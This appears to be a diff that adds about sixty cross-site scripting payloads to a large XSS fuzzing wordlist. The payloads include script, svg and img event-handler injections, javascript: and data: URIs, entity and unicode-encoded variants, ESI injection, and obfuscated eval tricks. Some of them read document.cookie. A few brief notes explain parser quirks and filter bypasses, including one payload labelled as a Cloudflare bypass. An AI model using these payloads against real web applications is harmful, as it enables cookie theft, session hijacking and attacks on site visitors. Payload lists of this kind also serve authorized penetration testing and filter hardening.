@@ -6612,3 +6612,65 @@ feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+'
 <div style=xss:expressio\00006e(alert(1))>
 <div style=xss:expressio\6e(alert(1))>
 <div style=xss:expressio&#x5c;6e(alert(1))>
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+<img src=# onerror=alert(1)>
+<a href="javascript:alert(1)">g</a>
+<input type="text" value="g" onmouseover="alert(1)" />
+<iframe src="javascript:alert(1)"></iframe>
+<svg/onload=alert(1);alert(2)>
+<svg/onload="alert(1);alert(2)">
+<svg/onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;;alert(2)">
+- Changing `;;` to `;` will fail
+- Double quotes can be removed
+- Decimal and hexadecimal possible
+<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>
+- The `\u` form can only be used in javascript. For example, changing `a` in `onload` to `\u0061` will fail.
+<title><a href="</title><svg/onload=alert(1)>
+- title has higher priority and directly interrupts other tags
+<svg><script>prompt&#40;1)</script>
+- HTML Entities will be parsed because of `<svg>
+- Removing `<svg>` will fail, `<script>` will not parse Entities
+<? foo="><script>alert(1)</script>">
+<! foo="><script>alert(1)</script>">
+</ foo="><script>alert(1)</script>">
+<% foo="><script>alert(1)</script>">
+<script>alert(1)</script>
+'"><script>alert(1)</script>
+<img/src=@ onerror=alert(1)/>
+'"><img/src=@ onerror=alert(1)/>
+' onmouseover=alert(1) x=''
+" onmouseover=alert(1) x="
+`` `onmouseover=alert(1) x=` ``
+javascript:alert(1)//
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt${document.domain}>
+<marquee+loop=1+width=0+onfinish='new+Functional\ert\1\``'>
+<d3v/onauxclick=[2].some(confirm)>click
+<x onauxclick=a=alert,a(domain)>click
+q=1" type=image sr>c<=x one>ror<="alert> (alert')
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"><polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/><script type="text/javascript">alert(document.domain);</script></svg>
+%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e
+<input type="button" onclick="document.write('&lt;img src=@ onerror=alert(1) /&gt;')" />
+"></script><script>alert(document.cookie)</script>
+"><img src=x onerror=alert(whoami)>
+<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>xss</a>
+<script>location.protocol='javascript'</script>
+<a href="javascript://%0aalert(1)">XSS</a>
+<iframe src="javascript:alert(1)">
+<a href=javascript:alert(1) >xss</a>
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==")>
+<iframe srcdoc="&#x3C;svg/&#x6f;nload=alert(document.domain)&#x3E;">
+<esi:include src=http://<domain>.com/xss.html>
+<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+<img/src='1'/onerror=alert(0)>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,1</script>
+<script>throw[onerror]=[alert],1</script>
+<script>var{a:onerror}={a:alert};throw 1</script>
+<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
+<script>new Function`X${document.location.hash.substr`1`}`</script>
+<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
+"%3Cmarquee%3E%3C%2Fbr%3E%3C%2Fbr%3E%27%22%3E%22%3E%3Ciframe%3E%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E"
